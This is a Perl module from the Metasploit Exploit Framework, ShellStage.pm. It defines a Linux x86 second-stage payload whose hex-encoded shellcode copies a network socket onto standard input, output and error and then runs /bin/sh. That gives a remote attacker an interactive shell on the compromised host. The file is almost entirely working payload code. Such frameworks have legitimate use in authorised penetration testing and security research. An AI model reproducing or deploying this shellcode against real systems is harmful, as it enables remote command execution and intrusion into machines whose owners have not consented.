###############
##
#
#    Name: ShellStage.pm
# Version: $Revision$
#  Source: src/shellcode/linux/ia32/stage_tcp_shell.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Executes a shell as a second stage.
#
##
###############

package Msf::PayloadComponent::Linux::ia32::ShellStage;

use strict;
use base 'Msf::PayloadComponent::Linux::StagePayload';

my $info =
{
	Authors           => [ 'skape <mmiller [at] hick.org>', ],
	Priv              => 0,
	StagePayload      => 
		{
			Payload =>
				"\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58" .
				"\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" .
				"\x89\xe1\xcd\x80"
		},
};

sub new
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash);

	return $self;
}

1;
